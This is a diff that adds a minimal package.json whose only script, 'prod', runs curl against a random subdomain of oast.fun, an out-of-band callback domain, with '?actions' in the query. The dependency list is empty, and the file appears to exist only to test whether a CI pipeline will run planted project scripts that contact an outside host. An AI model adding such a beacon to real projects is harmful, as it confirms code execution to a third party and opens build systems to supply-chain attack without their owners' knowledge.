@@ -1,0 +1,7 @@
+{
+  "scripts": {
+    "prod": "curl https://endyefjxkzchckfuoiip7isvkj535ftt6.oast.fun/?actions"
+  },
+  "devDependencies": {
+  }
+}
